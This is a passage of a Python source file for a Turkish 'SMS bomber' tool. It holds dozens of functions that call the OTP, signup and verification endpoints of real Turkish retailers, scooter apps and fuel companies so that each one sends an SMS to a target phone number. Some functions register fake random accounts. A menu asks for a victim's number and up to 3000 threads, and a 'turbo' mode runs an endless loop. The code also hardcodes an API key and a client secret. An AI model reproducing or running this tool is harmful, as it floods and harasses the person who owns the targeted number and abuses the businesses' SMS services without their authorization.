                    "Password": "31Memati31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "31",
                    "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603,
                    "TermsAndConditions": False}
            r = _post(url, headers=headers, json_data=body)
            if r.json().get("Control") == 1: return self._basari("crmmobil.baydoner.com")
            raise
        except: return self._hata("crmmobil.baydoner.com")

    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net/graphql/"
            headers = {"Content-Type": "application/json", "Authorization": "Bearer null",
                       "Origin": "https://pidem.azurewebsites.net", "Referer": "https://pidem.azurewebsites.net/"}
            body = {"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
                    "variables": {"phone": self.phone}}
            r = _post(url, headers=headers, json_data=body)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS": return self._basari("restashop.azurewebsites.net")
            raise
        except: return self._hata("restashop.azurewebsites.net")

    def Frink(self):
        try:
            url = "https://api.frink.com.tr/api/auth/postSendOTP"
            headers = {"Content-Type": "application/json", "Authorization": ""}
            r = _post(url, headers=headers, json_data={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone})
            if r.json().get("processStatus") == "SUCCESS": return self._basari("api.frink.com.tr")
            raise
        except: return self._hata("api.frink.com.tr")

    def a101(self):
        try:
            r = _post("https://www.a101.com.tr/users/otp-login/", json_data={"phone": f"0{self.phone}"}, timeout=5)
            if r.status_code == 200: return self._basari("a101.com.tr")
            raise
        except: return self._hata("a101.com.tr")

    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE"}
            r = _post(url, headers=headers, json_data={"gsm": "+90" + self.phone, "source": "orwi"})
            if r.status_code == 200: return self._basari("gandalf.orwi.app")
            raise
        except: return self._hata("gandalf.orwi.app")

    def defacto(self):
        try:
            r = _post("https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms",
                      json_data={"mobilePhone": f"0{self.phone}"}, timeout=5)
            if json.loads(r.text).get("Data") == "IsSMSSend": return self._basari("defacto")
            raise
        except: return self._hata("defacto")

    def ikinciyeni(self):
        try:
            body = {"accountType": 1,
                    "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
                    "isAddPermission": False,
                    "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                    "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
                    "phone": self.phone}
            r = _post("https://apigw.ikinciyeni.com/RegisterRequest", json_data=body, timeout=5)
            if json.loads(r.text).get("isSucceed") == True: return self._basari("ikinciyeni")
            raise
        except: return self._hata("ikinciyeni")

    def ceptesok(self):
        try:
            r = _post("https://api.ceptesok.com/api/users/sendsms",
                      json_data={"mobile_number.phone": self.phone, "token_type": "register_token"}, timeout=5)
            if r.status_code == 200: return self._basari("ceptesok")
            raise
        except: return self._hata("ceptesok")

    def pisir(self):
        try:
            r = _post("https://api.pisir.com/v1/login/", json_data={"msisdn": f"90{self.phone}"}, timeout=5)
            if json.loads(r.text).get("ok") == "1": return self._basari("pisir")
            raise
        except: return self._hata("pisir")

    def coffy(self):
        try:
            r = _post("https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode",
                      json_data={"phonenumber": f"+90{self.phone}"}, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("coffy")
            raise
        except: return self._hata("coffy")

    def sushico(self):
        try:
            r = _post("https://api.sushico.com.tr/tr/sendActivation",
                      json_data={"phone": f"+90{self.phone}", "location": 1, "locale": "tr"}, timeout=5)
            if json.loads(r.text).get("err") == 0: return self._basari("sushico")
            raise
        except: return self._hata("sushico")

    def kalmasin(self):
        try:
            body = {"dil": "tr", "device_id": "", "notification_mobile": "android-notificationid-will-be-added",
                    "platform": "android", "version": "2.0.6", "login_type": 1, "telefon": self.phone}
            r = _post("https://api.kalmasin.com.tr/user/login", json_data=body, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("kalmasin")
            raise
        except: return self._hata("kalmasin")

    def yotto(self):
        try:
            body = {"phone": f"+90 ({str(self.phone)[0:3]}) {str(self.phone)[3:6]}-{str(self.phone)[6:10]}"}
            r = _post("https://42577.smartomato.ru/account/session.json", json_data=body, timeout=5)
            if r.status_code == 201: return self._basari("yotto")
            raise
        except: return self._hata("yotto")

    def aygaz(self):
        try:
            r = _post("https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode",
                      json_data={"Gsm": self.phone}, timeout=5)
            if r.status_code == 200: return self._basari("aygaz")
            raise
        except: return self._hata("aygaz")

    def pawapp(self):
        try:
            body = {"languageId": "2", "mobileInformation": "",
                    "data": {"firstName": f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                             "lastName": f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                             "userAgreement": "true", "kvkk": "true",
                             "email": f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                             "phoneNo": self.phone,
                             "username": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"}}
            r = _post("https://api.pawder.app/api/authentication/sign-up", json_data=body, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("pawapp")
            raise
        except: return self._hata("pawapp")

    def mopas(self):
        try:
            url1 = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
            r = _post(url1, timeout=2)
            if r.status_code == 200:
                j = json.loads(r.text)
                token = j["access_token"]; token_type = j["token_type"]
                url2 = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobilenumber={self.phone}"
                r1 = _get(url2, headers={"authorization": f"{token_type} {token}"}, timeout=5)
                if r1.status_code == 200: return self._basari("mopas")
            raise
        except: return self._hata("mopas")

    def ninewest(self):
        try:
            body = {"alertMeWithEMail": False, "alertMeWithSms": False, "dataPermission": True,
                    "email": "asdafwqww44wt4t4@gmail.com", "genderId": random.randint(0, 3),
                    "hash": "5488b0f6de", "inviteCode": "",
                    "password": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
                    "phonenumber": f"({str(self.phone)[0:3]}) {str(self.phone)[3:6]} {str(self.phone)[6:8]} {str(self.phone)[8:10]}",
                    "registerContract": True, "registerMethod": "mail", "version": "3"}
            r = _post("https://www.ninewest.com.tr/webservice/v1/register.json", json_data=body, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("ninewest")
            raise
        except: return self._hata("ninewest")

    def saka(self):
        try:
            r = _post("https://mobilcrm2.saka.com.tr/api/customer/login", json_data={"gsm": f"0{self.phone}"}, timeout=5)
            if json.loads(r.text).get("status") == 1: return self._basari("saka")
            raise
        except: return self._hata("saka")

    def superpedestrian(self):
        try:
            r = _post("https://consumer-auth.linkyour.city/consumer_auth/register",
                      json_data={"phone_number": f"+90{str(self.phone)[0:3]} {str(self.phone)[3:6]} {str(self.phone)[6:10]}"}, timeout=5)
            if json.loads(r.text).get("detail") == "Ok": return self._basari("superpedestrian")
            raise
        except: return self._hata("superpedestrian")

    def gofody(self):
        try:
            r = _post("https://backend.gofody.com/api/v1/enduser/register/",
                      json_data={"country_code": "90", "phone": self.phone}, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("gofody")
            raise
        except: return self._hata("gofody")

    def weescooter(self):
        try:
            r = _post("https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin",
                      json_data={"tenant": "62a1e7efe74a84ea61f0d588", "gsm": self.phone}, timeout=5)
            if r.status_code == 200: return self._basari("weescooter")
            raise
        except: return self._hata("weescooter")

    def scooby(self):
        try:
            r = _get(f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phonenumber=90{self.phone}", timeout=5)
            if r.status_code == 200: return self._basari("scooby")
            raise
        except: return self._hata("scooby")

    def heyscooter(self):
        try:
            url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            r = _post(url, headers={"user-agent": "okhttp/3.12.1"}, timeout=5)
            if json.loads(r.text).get("IsSuccess") == True: return self._basari("heyscooter")
            raise
        except: return self._hata("heyscooter")

    def jetle(self):
        try:
            r = _get(f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={self.phone}&firmaID=1048", timeout=5)
            if r.status_code == 200: return self._basari("jetle")
            raise
        except: return self._hata("jetle")

    def rabbit(self):
        try:
            body = {"mobile_number": f"+90{self.phone}", "os_name": "android", "os_version": "7.1.2",
                    "app_version": " 1.0.2(12)", "push_id": "-"}
            r = _post("https://api.rbbt.com.tr/v1/auth/authenticate", json_data=body, timeout=5)
            if json.loads(r.text).get("status") == True: return self._basari("rabbit")
            raise
        except: return self._hata("rabbit")

    def roombadi(self):
        try:
            r = _post("https://api.roombadi.com/api/v1/auth/otp/authenticate",
                      json_data={"phone": self.phone, "countryId": 2}, timeout=5)
            if r.status_code == 200: return self._basari("roombadi")
            raise
        except: return self._hata("roombadi")

    def signalall(self):
        try:
            body = {"name": "", "phone": {"number": self.phone, "code": "90", "country_code": "TR", "name": ""},
                    "countryCallingCode": "+90", "countryCode": "TR", "approved": True, "notifyType": 99,
                    "favorites": [], "appKey": "live-exchange"}
            r = _post("https://appservices.huzk.com/client/register", json_data=body, timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("signalall")
            raise
        except: return self._hata("signalall")

    def goyakit(self):
        try:
            r = _get(f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=false", timeout=5)
            if json.loads(r.text)["data"]["success"] == True: return self._basari("goyakit")
            raise
        except: return self._hata("goyakit")

    def oliz(self):
        try:
            r = _post("https://api.oliz.com.tr/api/otp/send",
                      json_data={"mobile_number": self.phone, "type": None}, timeout=5)
            if json.loads(r.text)["meta"]["messages"]["success"][0] == "SUCCESS_SEND_SMS": return self._basari("oliz")
            raise
        except: return self._hata("oliz")

    def marti(self):
        try:
            r = _post("https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin",
                      json_data={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90"}, timeout=5)
            if json.loads(r.text).get("isSuccess") == True: return self._basari("marti")
            raise
        except: return self._hata("marti")

    def karma(self):
        try:
            body = {"phonenumber": f"90{self.phone}", "type": "REGISTER",
                    "deviceId": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
                    "language": "tr-TR"}
            r = _post("https://api.gokarma.app/v1/auth/send-sms", json_data=body, timeout=5)
            if r.status_code == 201: return self._basari("karma")
            raise
        except: return self._hata("karma")

    def hop(self):
        try:
            r = _post("https://api.hoplagit.com/v1/auth:reqSMS",
                      json_data={"phone": f"+90{self.phone}"}, timeout=5)
            if r.status_code == 201: return self._basari("hop")
            raise
        except: return self._hata("hop")

    def total(self):
        try:
            r = _post(f"https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms?gsmNo={self.phone}", timeout=5)
            if json.loads(r.text).get("success") == True: return self._basari("total")
            raise
        except: return self._hata("total")

    def petrolofisi(self):
        try:
            body = {"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True,
                    "deviceId": "", "etkContactPermission": True, "kvkkPermission": True,
                    "mobilePhone": f"0{self.phone}",
                    "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
                    "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
                    "positiveCard": "", "referenceCode": "",
                    "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"}
            r = _post("https://mobilapi.petrolofisi.com.tr/api/auth/register",
                      headers={"X-Channel": "IOS"}, json_data=body, timeout=5)
            if r.status_code == 204: return self._basari("petrolofisi")
            raise
        except: return self._hata("petrolofisi")


# ==================== SERVİS LİSTESİ ====================
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value) and not attribute.startswith('__'):
        servisler_sms.append(attribute)

def split_services(services, thread_count):
    chunk_size = math.ceil(len(services) / thread_count)
    return [services[i:i + chunk_size] for i in range(0, len(services), chunk_size)]

def run_services(sms, service_list, kere=None, aralik=0):
    if kere is None:
        while True:
            for service in service_list:
                getattr(sms, service)()
                sleep(aralik)
    else:
        while sms.adet < kere:
            for service in service_list:
                if sms.adet >= kere:
                    break
                getattr(sms, service)()
                sleep(aralik)

# ==================== BANNER ====================
def banner():
    temizle()
    print(f"""{R.C}{R.KA}
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
╚██████╗   ██║   ██████╔╝███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
{R.SF}""")
    print(f"{R.MO}{R.KA}              SMS BOMBER ARACI{R.SF}")
    print(f"{R.MO}{R.KA}                 Kurucu: CAN{R.SF}")
    print(f"{R.S}  SMS API: {R.Y}{len(servisler_sms)}{R.SF}\n")

# ==================== MENÜ ====================
def smsbomber_menu():
    while True:
        banner()
        print(f"{R.Y}[1]{R.SF} SMS Gönder (Normal)")
        print(f"{R.Y}[2]{R.SF} SMS Gönder (Turbo)")
        print(f"{R.K}[0]{R.SF} Geri\n")
        sec = input(f"{R.C}Seçim > {R.SF}").strip()
        if sec == "0":
            return
        if sec not in ("1", "2"):
            print(f"{R.K}Geçersiz seçim.{R.SF}")
            time.sleep(1)
            continue

        # Thread sayısı
        try:
            thread_count = int(input(f"{R.C}Thread sayısı (1-3000) > {R.SF}").strip())
            if thread_count < 1 or thread_count > 3000:
                raise ValueError
        except ValueError:
            print(f"{R.K}Geçersiz thread.{R.SF}")
            time.sleep(2)
            continue

        # Telefon
        tel_no = input(f"{R.C}Telefon (90 olmadan, örn: 5551234567) > {R.SF}").strip()
        if not tel_no.isdigit() or len(tel_no) != 10:
            print(f"{R.K}Geçersiz numara.{R.SF}")
            time.sleep(2)
            continue

        # Mail
        mail = input(f"{R.C}Mail (boş = rastgele) > {R.SF}").strip()

        if sec == "1":
            # Normal mod
            kere_s = input(f"{R.C}Kaç SMS (boş = sonsuz) > {R.SF}").strip()
            kere = int(kere_s) if kere_s.isdigit() else None
            aralik_s = input(f"{R.C}Aralık saniye (0) > {R.SF}").strip()
            aralik = float(aralik_s) if aralik_s.replace(".", "").isdigit() else 0

            sms = SendSms(tel_no, mail)
            chunks = split_services(servisler_sms, thread_count)
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                futures = []
                for chunk in chunks:
                    futures.append(ex.submit(run_services, sms, chunk, kere, aralik))
                try:
                    wait(futures)
                except KeyboardInterrupt:
                    print(f"\n{R.S}İptal edildi.{R.SF}")
                    time.sleep(1)

        elif sec == "2":
            # Turbo mod - sonsuz döngü
            sms = SendSms(tel_no, mail)
            chunks = split_services(servisler_sms, thread_count)
            try:
                while True:
                    with ThreadPoolExecutor(max_workers=thread_count) as ex:
                        futures = []
                        for chunk in chunks:
                            for service in chunk:
                                futures.append(ex.submit(getattr(sms, service)))
                        wait(futures)
            except KeyboardInterrupt:
                print(f"\n{R.S}Menüye dönülüyor...{R.SF}")
                time.sleep(1)

if __name__ == "__main__":
    smsbomber_menu()